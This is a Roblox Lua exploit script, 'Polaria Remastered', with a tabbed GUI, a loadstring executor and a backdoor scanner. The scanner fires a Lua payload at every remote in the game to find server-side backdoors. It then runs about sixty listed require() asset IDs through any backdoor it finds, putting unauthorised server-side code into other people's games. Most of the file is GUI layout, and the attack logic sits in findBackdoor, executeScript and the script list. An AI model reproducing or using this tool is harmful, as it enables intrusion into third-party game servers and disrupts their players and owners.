local CollectionService = game:GetService("CollectionService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local VirtualInputManager = game:GetService("VirtualInputManager")

getgenv().ignore = setmetatable({}, {__newindex = function() end})

function notify(title, text, duration)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = title,
        Text = text,
        Duration = duration or 5
    })
end

local player = Players.LocalPlayer

local Polaria = {}
Polaria["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
Polaria["PolariaRemastered"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
Polaria["PolariaRemastered"].ResetOnSpawn = false
CollectionService:AddTag(Polaria["PolariaRemastered"], [[main]]);

Polaria["Frame_2"] = Instance.new("Frame", Polaria["PolariaRemastered"]);
Polaria["Frame_2"]["BorderSizePixel"] = 0;
Polaria["Frame_2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
Polaria["Frame_2"]["Size"] = UDim2.new(0.5244, 0, 0.88844, 0);
Polaria["Frame_2"]["Position"] = UDim2.new(0, 194, 0, 10);
Polaria["Frame_2"]["Name"] = "MainContainer"

Polaria["Close_3"] = Instance.new("TextButton", Polaria["Frame_2"]);
Polaria["Close_3"]["TextWrapped"] = true;
Polaria["Close_3"]["BorderSizePixel"] = 0;
Polaria["Close_3"]["TextScaled"] = true;
Polaria["Close_3"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
Polaria["Close_3"]["BackgroundColor3"] = Color3.fromRGB(23, 23, 23);
Polaria["Close_3"]["Size"] = UDim2.new(0.08257, 0, 0.11465, 0);
Polaria["Close_3"]["Text"] = [[×]];
Polaria["Close_3"]["Name"] = [[Close]];
Polaria["Close_3"]["Position"] = UDim2.new(0, 400, 0, 0);
Polaria["UICorner_4"] = Instance.new("UICorner", Polaria["Close_3"]);

Polaria["TopBar_5"] = Instance.new("Folder", Polaria["Frame_2"]);
Polaria["TopBar_5"]["Name"] = [[TopBar]];

Polaria["Home_Tab_a"] = Instance.new("TextButton", Polaria["TopBar_5"]);
Polaria["Home_Tab_a"]["TextWrapped"] = true;
Polaria["Home_Tab_a"]["BorderSizePixel"] = 0;
Polaria["Home_Tab_a"]["TextSize"] = 24;
Polaria["Home_Tab_a"]["TextScaled"] = true;
Polaria["Home_Tab_a"]["TextColor3"] = Color3.fromRGB(187, 0, 255);
Polaria["Home_Tab_a"]["BackgroundColor3"] = Color3.fromRGB(23, 23, 23);
Polaria["Home_Tab_a"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
Polaria["Home_Tab_a"]["Size"] = UDim2.new(0.18349, 0, 0.09554, 0);
Polaria["Home_Tab_a"]["Text"] = [[Home]];
Polaria["Home_Tab_a"]["Name"] = [[Home_Tab]];
Polaria["Home_Tab_a"]["Position"] = UDim2.new(0, 2, 0, 42);
Polaria["UICorner_b"] = Instance.new("UICorner", Polaria["Home_Tab_a"]);

Polaria["Scripts_Tab_6"] = Instance.new("TextButton", Polaria["TopBar_5"]);
Polaria["Scripts_Tab_6"]["TextWrapped"] = true;
Polaria["Scripts_Tab_6"]["BorderSizePixel"] = 0;
Polaria["Scripts_Tab_6"]["TextSize"] = 24;
Polaria["Scripts_Tab_6"]["TextScaled"] = true;
Polaria["Scripts_Tab_6"]["TextColor3"] = Color3.fromRGB(187, 0, 255);
Polaria["Scripts_Tab_6"]["BackgroundColor3"] = Color3.fromRGB(23, 23, 23);
Polaria["Scripts_Tab_6"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
Polaria["Scripts_Tab_6"]["Size"] = UDim2.new(0.18349, 0, 0.09554, 0);
Polaria["Scripts_Tab_6"]["Text"] = [[Scripts]];
Polaria["Scripts_Tab_6"]["Name"] = [[Scripts_Tab]];
Polaria["Scripts_Tab_6"]["Position"] = UDim2.new(0, 86, 0, 42);
Polaria["UICorner_7"] = Instance.new("UICorner", Polaria["Scripts_Tab_6"]);

Polaria["Exe_Tab_8"] = Instance.new("TextButton", Polaria["TopBar_5"]);
Polaria["Exe_Tab_8"]["TextWrapped"] = true;
Polaria["Exe_Tab_8"]["BorderSizePixel"] = 0;
Polaria["Exe_Tab_8"]["TextSize"] = 24;
Polaria["Exe_Tab_8"]["TextScaled"] = true;
Polaria["Exe_Tab_8"]["TextColor3"] = Color3.fromRGB(187, 0, 255);
Polaria["Exe_Tab_8"]["BackgroundColor3"] = Color3.fromRGB(23, 23, 23);
Polaria["Exe_Tab_8"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
Polaria["Exe_Tab_8"]["Size"] = UDim2.new(0.18349, 0, 0.09554, 0);
Polaria["Exe_Tab_8"]["Text"] = [[Executor]];
Polaria["Exe_Tab_8"]["Name"] = [[Exe_Tab]];
Polaria["Exe_Tab_8"]["Position"] = UDim2.new(0, 170, 0, 42);
Polaria["UICorner_9"] = Instance.new("UICorner", Polaria["Exe_Tab_8"]);

Polaria["Credits_Tab_c"] = Instance.new("TextButton", Polaria["TopBar_5"]);
Polaria["Credits_Tab_c"]["TextWrapped"] = true;
Polaria["Credits_Tab_c"]["BorderSizePixel"] = 0;
Polaria["Credits_Tab_c"]["TextSize"] = 24;
Polaria["Credits_Tab_c"]["TextScaled"] = true;
Polaria["Credits_Tab_c"]["TextColor3"] = Color3.fromRGB(187, 0, 255);
Polaria["Credits_Tab_c"]["BackgroundColor3"] = Color3.fromRGB(23, 23, 23);
Polaria["Credits_Tab_c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
Polaria["Credits_Tab_c"]["Size"] = UDim2.new(0.18349, 0, 0.09554, 0);
Polaria["Credits_Tab_c"]["Text"] = [[Credits]];
Polaria["Credits_Tab_c"]["Name"] = [[Credits_Tab]];
Polaria["Credits_Tab_c"]["Position"] = UDim2.new(0, 254, 0, 42);
Polaria["UICorner_d"] = Instance.new("UICorner", Polaria["Credits_Tab_c"]);

Polaria["UIStroke_e"] = Instance.new("UIStroke", Polaria["Frame_2"]);
Polaria["UIStroke_e"]["Thickness"] = 2;
Polaria["UIStroke_e"]["Color"] = Color3.fromRGB(187, 0, 255);
Polaria["UICorner_f"] = Instance.new("UICorner", Polaria["Frame_2"]);

Polaria["Hide_10"] = Instance.new("TextButton", Polaria["Frame_2"]);
Polaria["Hide_10"]["TextWrapped"] = true;
Polaria["Hide_10"]["BorderSizePixel"] = 0;
Polaria["Hide_10"]["TextScaled"] = true;
Polaria["Hide_10"]["TextColor3"] = Color3.fromRGB(187, 0, 255);
Polaria["Hide_10"]["BackgroundColor3"] = Color3.fromRGB(23, 23, 23);
Polaria["Hide_10"]["Size"] = UDim2.new(0.08257, 0, 0.11465, 0);
Polaria["Hide_10"]["Text"] = [[–]];
Polaria["Hide_10"]["Name"] = [[Hide]];
Polaria["Hide_10"]["Position"] = UDim2.new(0, 362, 0, 0);
Polaria["UICorner_11"] = Instance.new("UICorner", Polaria["Hide_10"]);

Polaria["Title_12"] = Instance.new("TextLabel", Polaria["Frame_2"]);
Polaria["Title_12"]["TextWrapped"] = true;
Polaria["Title_12"]["BorderSizePixel"] = 0;
Polaria["Title_12"]["TextSize"] = 24;
Polaria["Title_12"]["TextXAlignment"] = Enum.TextXAlignment.Left;
Polaria["Title_12"]["BackgroundColor3"] = Color3.fromRGB(23, 23, 23);
Polaria["Title_12"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
Polaria["Title_12"]["TextColor3"] = Color3.fromRGB(187, 0, 255);
Polaria["Title_12"]["Size"] = UDim2.new(0.81651, 0, 0.11465, 0);
Polaria["Title_12"]["Text"] = [[Polaria Remastered]];
Polaria["Title_12"]["Name"] = [[Title]];
Polaria["Title_12"]["Position"] = UDim2.new(0, 2, 0, 0);
Polaria["UICorner_13"] = Instance.new("UICorner", Polaria["Title_12"]);

Polaria["Frame_14"] = Instance.new("Frame", Polaria["Frame_2"]);
Polaria["Frame_14"]["BorderSizePixel"] = 0;
Polaria["Frame_14"]["BackgroundColor3"] = Color3.fromRGB(187, 0, 255);
Polaria["Frame_14"]["Size"] = UDim2.new(1, 0, 0.00637, 0);
Polaria["Frame_14"]["Position"] = UDim2.new(0, 0, 0, 38);

Polaria["HomeContent"] = Instance.new("Frame", Polaria["Frame_2"])
Polaria["HomeContent"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
Polaria["HomeContent"]["BackgroundTransparency"] = 1
Polaria["HomeContent"]["Size"] = UDim2.new(1, 0, 1, -50)
Polaria["HomeContent"]["Position"] = UDim2.new(0, 0, 0, 50)
Polaria["HomeContent"]["Name"] = "HomeContent"

Polaria["ScriptsContent"] = Instance.new("Frame", Polaria["Frame_2"])
Polaria["ScriptsContent"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
Polaria["ScriptsContent"]["BackgroundTransparency"] = 1
Polaria["ScriptsContent"]["Size"] = UDim2.new(1, 0, 1, -50)
Polaria["ScriptsContent"]["Position"] = UDim2.new(0, 0, 0, 50)
Polaria["ScriptsContent"]["Name"] = "ScriptsContent"
Polaria["ScriptsContent"]["Visible"] = false

Polaria["ExecutorContent"] = Instance.new("Frame", Polaria["Frame_2"])
Polaria["ExecutorContent"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
Polaria["ExecutorContent"]["BackgroundTransparency"] = 1
Polaria["ExecutorContent"]["Size"] = UDim2.new(1, 0, 1, -50)
Polaria["ExecutorContent"]["Position"] = UDim2.new(0, 0, 0, 50)
Polaria["ExecutorContent"]["Name"] = "ExecutorContent"
Polaria["ExecutorContent"]["Visible"] = false

Polaria["CreditsContent"] = Instance.new("Frame", Polaria["Frame_2"])
Polaria["CreditsContent"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
Polaria["CreditsContent"]["BackgroundTransparency"] = 1
Polaria["CreditsContent"]["Size"] = UDim2.new(1, 0, 1, -50)
Polaria["CreditsContent"]["Position"] = UDim2.new(0, 0, 0, 50)
Polaria["CreditsContent"]["Name"] = "CreditsContent"
Polaria["CreditsContent"]["Visible"] = false

Polaria["WelcomeLabel"] = Instance.new("TextLabel", Polaria["HomeContent"])
Polaria["WelcomeLabel"]["TextWrapped"] = true
Polaria["WelcomeLabel"]["BorderSizePixel"] = 0
Polaria["WelcomeLabel"]["TextSize"] = 20
Polaria["WelcomeLabel"]["TextScaled"] = true
Polaria["WelcomeLabel"]["BackgroundColor3"] = Color3.fromRGB(23, 23, 23)
Polaria["WelcomeLabel"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
Polaria["WelcomeLabel"]["TextColor3"] = Color3.fromRGB(187, 0, 255)
Polaria["WelcomeLabel"]["Size"] = UDim2.new(0.7844, 0, 0.08917, 0)
Polaria["WelcomeLabel"]["Text"] = "Welcome to Polaria Remastered, " .. player.Name .. "!"
Polaria["WelcomeLabel"]["Position"] = UDim2.new(0, 86, 0, 28)
Polaria["UICorner_Welcome"] = Instance.new("UICorner", Polaria["WelcomeLabel"])

Polaria["Plr_PFP_14"] = Instance.new("ImageLabel", Polaria["HomeContent"])
Polaria["Plr_PFP_14"]["BorderSizePixel"] = 0
Polaria["Plr_PFP_14"]["BackgroundColor3"] = Color3.fromRGB(23, 23, 23)
Polaria["Plr_PFP_14"]["Size"] = UDim2.new(0.18349, 0, 0.18349, 0)
Polaria["Plr_PFP_14"]["Position"] = UDim2.new(0, 4, 0, 30)
Polaria["Plr_PFP_14"]["Name"] = [[Plr_PFP]]
Polaria["UICorner_15"] = Instance.new("UICorner", Polaria["Plr_PFP_14"])
Polaria["UICorner_15"]["CornerRadius"] = UDim.new(1, 0)
Polaria["UIStroke_16"] = Instance.new("UIStroke", Polaria["Plr_PFP_14"])
Polaria["UIStroke_16"]["Color"] = Color3.fromRGB(187, 0, 255)

Polaria["StatsLabel"] = Instance.new("TextLabel", Polaria["HomeContent"])
Polaria["StatsLabel"]["TextWrapped"] = true
Polaria["StatsLabel"]["BorderSizePixel"] = 0
Polaria["StatsLabel"]["TextSize"] = 14
Polaria["StatsLabel"]["TextXAlignment"] = Enum.TextXAlignment.Left
Polaria["StatsLabel"]["TextYAlignment"] = Enum.TextYAlignment.Top
Polaria["StatsLabel"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
Polaria["StatsLabel"]["TextColor3"] = Color3.fromRGB(187, 0, 255)
Polaria["StatsLabel"]["BackgroundTransparency"] = 1
Polaria["StatsLabel"]["RichText"] = true
Polaria["StatsLabel"]["Size"] = UDim2.new(0.77982, 0, 0.64331, 0)
Polaria["StatsLabel"]["Text"] = "Username: Loading...\nFPS: Calculating...\nPing: Calculating...\nGame: Loading...\nGameID: Loading..."
Polaria["StatsLabel"]["Name"] = [[StatsLabel]]
Polaria["StatsLabel"]["Position"] = UDim2.new(0, 88, 0, 58)

Polaria["ScriptsList"] = Instance.new("ScrollingFrame", Polaria["ScriptsContent"])
Polaria["ScriptsList"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
Polaria["ScriptsList"]["BackgroundTransparency"] = 1
Polaria["ScriptsList"]["Size"] = UDim2.new(1, -10, 1, -10)
Polaria["ScriptsList"]["Position"] = UDim2.new(0, 5, 0, 5)
Polaria["ScriptsList"]["CanvasSize"] = UDim2.new(0, 0, 0, 0)
Polaria["ScriptsList"]["ScrollBarThickness"] = 8
Polaria["ScriptsList"]["Name"] = "ScriptsList"

Polaria["UIListLayout"] = Instance.new("UIListLayout", Polaria["ScriptsList"])
Polaria["UIListLayout"]["Padding"] = UDim.new(0, 5)
Polaria["UIListLayout"]["SortOrder"] = Enum.SortOrder.LayoutOrder

Polaria["Exe_Input_5"] = Instance.new("TextBox", Polaria["ExecutorContent"])
Polaria["Exe_Input_5"]["CursorPosition"] = -1
Polaria["Exe_Input_5"]["Name"] = [[Exe_Input]]
Polaria["Exe_Input_5"]["TextXAlignment"] = Enum.TextXAlignment.Left
Polaria["Exe_Input_5"]["BorderSizePixel"] = 0
Polaria["Exe_Input_5"]["TextSize"] = 18
Polaria["Exe_Input_5"]["TextYAlignment"] = Enum.TextYAlignment.Top
Polaria["Exe_Input_5"]["BackgroundColor3"] = Color3.fromRGB(23, 23, 23)
Polaria["Exe_Input_5"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
Polaria["Exe_Input_5"]["MultiLine"] = true
Polaria["Exe_Input_5"]["PlaceholderText"] = [[Your script here...]]
Polaria["Exe_Input_5"]["Size"] = UDim2.new(0.98165, 0, 0.61783, 0)
Polaria["Exe_Input_5"]["Position"] = UDim2.new(0, 4, 0, 30)
Polaria["Exe_Input_5"]["Text"] = [[]]

Polaria["Exe_Btn_3"] = Instance.new("TextButton", Polaria["ExecutorContent"])
Polaria["Exe_Btn_3"]["TextWrapped"] = true
Polaria["Exe_Btn_3"]["BorderSizePixel"] = 0
Polaria["Exe_Btn_3"]["TextScaled"] = true
Polaria["Exe_Btn_3"]["TextColor3"] = Color3.fromRGB(187, 0, 255)
Polaria["Exe_Btn_3"]["BackgroundColor3"] = Color3.fromRGB(23, 23, 23)
Polaria["Exe_Btn_3"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
Polaria["Exe_Btn_3"]["Size"] = UDim2.new(0.20642, 0, 0.10191, 0)
Polaria["Exe_Btn_3"]["Text"] = [[Execute]]
Polaria["Exe_Btn_3"]["Name"] = [[Exe_Btn]]
Polaria["Exe_Btn_3"]["Position"] = UDim2.new(0, 4, 0, 228)
Polaria["UICorner_4"] = Instance.new("UICorner", Polaria["Exe_Btn_3"])

Polaria["Clr_Btn_13"] = Instance.new("TextButton", Polaria["ExecutorContent"])
Polaria["Clr_Btn_13"]["TextWrapped"] = true
Polaria["Clr_Btn_13"]["BorderSizePixel"] = 0
Polaria["Clr_Btn_13"]["TextScaled"] = true
Polaria["Clr_Btn_13"]["TextColor3"] = Color3.fromRGB(187, 0, 255)
Polaria["Clr_Btn_13"]["BackgroundColor3"] = Color3.fromRGB(23, 23, 23)
Polaria["Clr_Btn_13"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
Polaria["Clr_Btn_13"]["Size"] = UDim2.new(0.20642, 0, 0.10191, 0)
Polaria["Clr_Btn_13"]["Text"] = [[Clear]]
Polaria["Clr_Btn_13"]["Name"] = [[Clr_Btn]]
Polaria["Clr_Btn_13"]["Position"] = UDim2.new(0, 96, 0, 228)
Polaria["UICorner_14"] = Instance.new("UICorner", Polaria["Clr_Btn_13"])

Polaria["CreditsText"] = Instance.new("TextLabel", Polaria["CreditsContent"])
Polaria["CreditsText"]["BorderSizePixel"] = 0
Polaria["CreditsText"]["TextSize"] = 20
Polaria["CreditsText"]["TextXAlignment"] = Enum.TextXAlignment.Left
Polaria["CreditsText"]["TextYAlignment"] = Enum.TextYAlignment.Top
Polaria["CreditsText"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
Polaria["CreditsText"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
Polaria["CreditsText"]["TextColor3"] = Color3.fromRGB(187, 0, 255)
Polaria["CreditsText"]["BackgroundTransparency"] = 1
Polaria["CreditsText"]["Size"] = UDim2.new(0.98624, 0, 0.74522, 0)
Polaria["CreditsText"]["Text"] = [[Original Polaria made by: Polaria Team

Polaria Remastered by: ]] .. player.Name .. [[

Features:
• Home Tab with Player Stats
• Scripts Tab with Pre-made Scripts
• Executor Tab for Custom Scripts
• Credits Tab

Special Thanks:
• VoidWare for backdoor scanning logic
• Forge for UI inspiration

This is a family-friendly version with no inappropriate content.]]
Polaria["CreditsText"]["Position"] = UDim2.new(0, 2, 0, 28)

local statsConnections = {}
local fpsCounter = 0
local lastTime = tick()
local frameCount = 0

local function getPing()
    local ping = player:GetNetworkPing()
    return math.floor(ping * 1000)
end

local function updateStats()
    local statsLabel = Polaria["StatsLabel"]
    if statsLabel then
        frameCount = frameCount + 1
        local currentTime = tick()
        
        if currentTime - lastTime >= 1 then
            fpsCounter = math.floor(frameCount / (currentTime - lastTime))
            frameCount = 0
            lastTime = currentTime
        end
        
        local ping = getPing()
        local username = player.Name
        local gameId = game.PlaceId
        local gameName = "Unknown"
        
        local success, result = pcall(function()
            return game:GetService("MarketplaceService"):GetProductInfo(gameId)
        end)
        
        if success and result then
            gameName = result.Name
        end
        
        statsLabel.Text = string.format("Username: %s\nFPS: %d\nPing: %d ms\nGame: %s\nGameID: %d", 
            username, fpsCounter, ping, gameName, gameId)
    end
end

local function loadPlayerAvatar()
    local pfpFrame = Polaria["Plr_PFP_14"]
    if pfpFrame then
        local userId = player.UserId
        local thumbType = Enum.ThumbnailType.HeadShot
        local thumbSize = Enum.ThumbnailSize.Size420x420
        
        local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
        pfpFrame.Image = content
    end
end

local currentTab = "home"

local function switchTab(tabName)
    currentTab = tabName
    
    Polaria["HomeContent"].Visible = (tabName == "home")
    Polaria["ScriptsContent"].Visible = (tabName == "scripts")
    Polaria["ExecutorContent"].Visible = (tabName == "executor")
    Polaria["CreditsContent"].Visible = (tabName == "credits")
    
    local homeBtn = Polaria["Home_Tab_a"]
    local scriptsBtn = Polaria["Scripts_Tab_6"]
    local executorBtn = Polaria["Exe_Tab_8"]
    local creditsBtn = Polaria["Credits_Tab_c"]
    
    if homeBtn then
        homeBtn.BackgroundColor3 = (tabName == "home") and Color3.fromRGB(50, 50, 50) or Color3.fromRGB(23, 23, 23)
    end
    if scriptsBtn then
        scriptsBtn.BackgroundColor3 = (tabName == "scripts") and Color3.fromRGB(50, 50, 50) or Color3.fromRGB(23, 23, 23)
    end
    if executorBtn then
        executorBtn.BackgroundColor3 = (tabName == "executor") and Color3.fromRGB(50, 50, 50) or Color3.fromRGB(23, 23, 23)
    end
    if creditsBtn then
        creditsBtn.BackgroundColor3 = (tabName == "credits") and Color3.fromRGB(50, 50, 50) or Color3.fromRGB(23, 23, 23)
    end
    
    if tabName == "scripts" then
        updateScriptsList()
    end
end

local backdoor = nil
local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}

local function generateName(length)
    local text = ''
    for i = 1, length do
        text = text .. alphabet[math.random(1,#alphabet)]
    end
    return text
end

local function runRemote(remote, data)
    if remote:IsA('RemoteEvent') then
        remote:FireServer(data)
    elseif remote:IsA('RemoteFunction') then
        spawn(function()
            remote:InvokeServer(data)
        end)
    end
end

local function findBackdoor()
    local remotes = {}
    
    local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
    if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
        local code = generateName(math.random(12,30))
        spawn(function()
            protected_backdoor:InvokeServer('Polaria Remastered - Backdoor Scanner', "a=Instance.new('Model',workspace)a.Name='"..code.."'")
        end)
        remotes[code] = protected_backdoor
    end
    
    for i, remote in game:GetDescendants() do
        if not remote:IsA('RemoteEvent') and not remote:IsA('RemoteFunction') then
            continue
        end
        
        if string.split(remote:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then
            continue
        end
        
        if remote.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent.Parent==game:GetService("ReplicatedStorage") then
            if remote:FindFirstChild('__FUNCTION') or remote.Name=='__FUNCTION' then
                continue
            end
            if remote.Parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then
                continue
            end
            if remote.Parent.Name=='DefaultChatSystemChatEvents' then
                continue
            end
        end
        
        local code = generateName(math.random(12,30))
        runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
        remotes[code] = remote
    end
    
    for i = 1, 50 do
        for code, remote in remotes do
            if workspace:FindFirstChild(code) then
                backdoor = remote
                return true
            end
        end
        task.wait(0.1)
    end
    
    return false
end

local function executeScript(scriptText, scriptType)
    if scriptType == "require" then
        if backdoor then
            runRemote(backdoor, scriptText)
        else
            notify("Polaria Remastered", "Backdoor not found! :(", 4)
        end
    else
        local success, error = pcall(function()
            loadstring(scriptText)()
        end)
        if not success then
            warn("Execution error: " .. error)
        end
    end
end

local scriptData = {
    {name = "???", code = "require(7507755382).load('" .. player.Name .. "')", type = "require"},
    {name = "Sally Moment", code = "require(77877793619050).sally('" .. player.Name .. "', \"Sally Moment\")", type = "require"},
    {name = "Horseman", code = "require(3737497650).load('" .. player.Name .. "')", type = "require"},
    {name = "Cool gun script", code = "require(5813879549).load('" .. player.Name .. "')", type = "require"},
    {name = "Script 5", code = "require(4618428149).load('" .. player.Name .. "')", type = "require"},
    {name = "Hypercar", code = "require(5874393699).load('" .. player.Name .. "')", type = "require"},
    {name = "Neon Overlord", code = "require(5876551530).load('" .. player.Name .. "')", type = "require"},
    {name = "Clown Kidnap", code = "require(5591099977)('" .. player.Name .. "')", type = "require"},
    {name = "Thanos", code = "require(4920151387).load('" .. player.Name .. "')", type = "require"},
    {name = "The sun is a deadly lazer", code = "require(5751710030).Sun('" .. player.Name .. "')", type = "require"},
    {name = "Ying yang", code = "require(4875966146).load('" .. player.Name .. "')", type = "require"},
    {name = "Titanium runner", code = "require(5375511885).Player('" .. player.Name .. "')", type = "require"},
    {name = "Crypt", code = "require(5455352803).crypt('" .. player.Name .. "')", type = "require"},
    {name = "Rainbow factory", code = "require(4823100870).HowRainbowsAreMade('" .. player.Name .. "')", type = "require"},
    {name = "Ares the bladist", code = "require(5813806760).load('" .. player.Name .. "')", type = "require"},
    {name = "Visualizer", code = "require(5684993096).load('" .. player.Name .. "')", type = "require"},
    {name = "Hacker X", code = "require(5641200549).load('" .. player.Name .. "')", type = "require"},
    {name = "Fallen angel", code = "require(4490557105).load('" .. player.Name .. "')", type = "require"},
    {name = "Dodge Charger", code = "require(4697572245).load('" .. player.Name .. "')", type = "require"},
    {name = "Soldier", code = "require(5177488826).Soldier('" .. player.Name .. "')", type = "require"},
    {name = "Grab knife", code = "require(5516594078)('" .. player.Name .. "')", type = "require"},
    {name = "Pizza Guy", code = "require(4657036575).load('" .. player.Name .. "')", type = "require"},
    {name = "Darth Vader", code = "require(5441060212).load('" .. player.Name .. "')", type = "require"},
    {name = "Ban hammer", code = "require(5448035802).Hammer('" .. player.Name .. "', \"BanHammer\")", type = "require"},
    {name = "Crescendo", code = "require(4328810253).load('" .. player.Name .. "')", type = "require"},
    {name = "Hell Robotics", code = "require(5813792606).load('" .. player.Name .. "')", type = "require"},
    {name = "Cyber knight", code = "require(5617200606).Cyber('" .. player.Name .. "')", type = "require"},
    {name = "Articulacy", code = "require(5730283203).Articulacy('" .. player.Name .. "')", type = "require"},
    {name = "Neptunian V", code = "require(4453491513).load('" .. player.Name .. "')", type = "require"},
    {name = "Obliterator", code = "require(5375491266).Player('" .. player.Name .. "')", type = "require"},
    {name = "Rainbow Stand", code = "require(5367599184).Dark('" .. player.Name .. "')", type = "require"},
    {name = "Tron Bike", code = "require(4021975182).load('" .. player.Name .. "')", type = "require"},
    {name = "Infinity Gauntlet", code = "require(5375537557).Dark('" .. player.Name .. "')", type = "require"},
    {name = "Templar", code = "require(5313663424).Dark('" .. player.Name .. "')", type = "require"},
    {name = "Baseball Bat", code = "require(4559977647).load('" .. player.Name .. "')", type = "require"},
    {name = "Dominus Venari", code = "require(3256686965).load('" .. player.Name .. "')", type = "require"},
    {name = "Reaper", code = "require(4185644819).a('" .. player.Name .. "')", type = "require"},
    {name = "SCP 106", code = "require(4935275557).Subaru112('" .. player.Name .. "', \"Subaru112's SCP-106\")", type = "require"},
    {name = "Dubstep Gun", code = "require(4442010059).load('" .. player.Name .. "')", type = "require"},
    {name = "Karambit", code = "require(5970744588).load('" .. player.Name .. "')", type = "require"},
    {name = "Infinite Yield", code = "require(3023102224)('" .. player.Name .. "')", type = "require"},
    {name = "Death Sheriff", code = "require(6056559552).load('" .. player.Name .. "')", type = "require"},
    {name = "Dominus Frigidus", code = "require(6054361648).load('" .. player.Name .. "')", type = "require"},
    {name = "Piano", code = "require(5983549520).load('" .. player.Name .. "')", type = "require"},
    {name = "Chat control gui", code = "require(5903403087).load('" .. player.Name .. "')", type = "require"},
    {name = "Echo", code = "require(5374597845).Dark('" .. player.Name .. "')", type = "require"},
    {name = "KFC", code = "require(3615713971).load('" .. player.Name .. "')", type = "require"},
    {name = "Legake Glove", code = "require(5187166380)('" .. player.Name .. "')", type = "require"},
    {name = "Chainsaw", code = "require(4560014954).load('" .. player.Name .. "')", type = "require"},
    {name = "Dark Eccentric Wrench", code = "require(5712519660).load('" .. player.Name .. "')", type = "require"},
    {name = "Alpha Gatling Gun", code = "require(5451379778).Gun('" .. player.Name .. "')", type = "require"},
    {name = "Frisk", code = "require(5849995364).load('" .. player.Name .. "')", type = "require"},
    {name = "Gentleman Killbot", code = "require(5430831931).Dark('" .. player.Name .. "')", type = "require"},
    {name = "Despacito Mech", code = "require(4105428725).load('" .. player.Name .. "')", type = "require"},
    {name = "Sirenhead", code = "require(5239955586).Dark('" .. player.Name .. "')", type = "require"},
    {name = "Lost Soul", code = "require(5390158029).Dark('" .. player.Name .. "')", type = "require"},
    {name = "Betty Noire", code = "require(5139373601).load('" .. player.Name .. "')", type = "require"},
    {name = "Hallow Slayer", code = "require(2675506369).hal('" .. player.Name .. "')", type = "require"},
    {name = "Skid Beater", code = "require(3530402272)('" .. player.Name .. "')", type = "require"},
    {name = "Chronos Sentinel", code = "require(3089107241).naenac('" .. player.Name .. "')", type = "require"},
    {name = "Pity Hub", code = "require(3253460334)('" .. player.Name .. "')", type = "require"}
}

local function createButton(name, parent, scriptData)
    local button = Instance.new("TextButton")
    button.Name = "ScriptBtn_" .. name
    button.TextWrapped = true
    button.BorderSizePixel = 0
    button.TextScaled = true
    button.TextColor3 = Color3.fromRGB(187, 0, 255)
    button.BackgroundColor3 = Color3.fromRGB(23, 23, 23)
    button.Size = UDim2.new(0.95, 0, 0, 30)
    button.Text = name
    button.Parent = parent
    
    local corner = Instance.new("UICorner")
    corner.Parent = button
    
    button.MouseButton1Click:Connect(function()
        executeScript(scriptData.code, scriptData.type)
    end)
    
    return button
end

local function updateScriptsList()
    local scriptsList = Polaria["ScriptsList"]
    if not scriptsList then return end
    
    for _, child in pairs(scriptsList:GetChildren()) do
        if child:IsA("TextButton") then
            child:Destroy()
        end
    end
    
    for i, script in ipairs(scriptData) do
        createButton(script.name, scriptsList, script)
    end
    
    scriptsList.CanvasSize = UDim2.new(0, 0, 0, #scriptData * 35)
end

local function dragify(Frame)
    local dragToggle = nil
    local dragSpeed = .25
    local dragInput = nil
    local dragStart = nil
    local startPos = nil
    
    local function updateInput(input)
        local Delta = input.Position - dragStart
        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
        game:GetService("TweenService"):Create(Frame, TweenInfo.new(.25), {Position = Position}):Play()
    end
    
